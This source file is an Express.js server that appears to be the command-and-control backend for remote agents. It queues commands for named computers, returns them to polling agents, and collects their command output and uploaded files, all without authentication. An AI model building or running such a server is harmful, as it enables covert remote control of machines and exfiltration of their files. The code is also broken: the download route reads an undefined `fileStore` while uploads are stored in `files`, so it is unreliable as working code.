const express = require("express");
const app = express();

app.use(express.json());

let commands = {};
let outputs = {};
let files = {};

// -----------------------------
// 🟢 TEST API
// -----------------------------
app.get("/", (req, res) => {
  res.json({ command: null });
});

// -----------------------------
// 📥 SEND COMMAND
// -----------------------------
app.post("/api/send-command", (req, res) => {
  const { computer, command } = req.body;

  if (!computer || !command) {
    return res.status(400).send("Invalid request");
  }

  commands[computer] = command;
  res.send("Command sent");
});

// -----------------------------
// 📤 GET COMMAND (AGENT CALLS)
// -----------------------------
app.get("/api/get-command", (req, res) => {
  const pc = req.query.pc;

  if (!pc) return res.json({ command: null });

  const cmd = commands[pc] || null;

  // Clear command after sending (important)
  commands[pc] = null;

  res.json({ command: cmd });
});

// -----------------------------
// 📤 RECEIVE OUTPUT
// -----------------------------
app.post("/api/send-output", (req, res) => {
  const { computer, output } = req.body;

  outputs[computer] = output;
  res.send("Output received");
});

// -----------------------------
// 📥 GET OUTPUT
// -----------------------------
app.get("/api/get-output", (req, res) => {
  const pc = req.query.pc;

  res.json({
    output: outputs[pc] || null
  });
});

// -----------------------------
// 📤 RECEIVE FILE
// -----------------------------
app.post("/api/upload-file", (req, res) => {
  const { computer, filename, content } = req.body;

  files[computer] = {
    filename,
    content
  };

  res.send("File received");
});

// -----------------------------
// 📥 DOWNLOAD FILE
// -----------------------------
app.get('/api/download-file', (req, res) => {
    const pc = req.query.pc;

    if (fileStore[pc]) {

        const file = fileStore[pc];
        const buffer = Buffer.from(file.content, 'base64');

        res.setHeader('Content-Disposition', `attachment; filename=${file.filename}`);
        res.setHeader('Content-Type', 'application/octet-stream');

        res.send(buffer);

    } else {
        res.send("No file available");
    }
});

// -----------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port " + PORT));
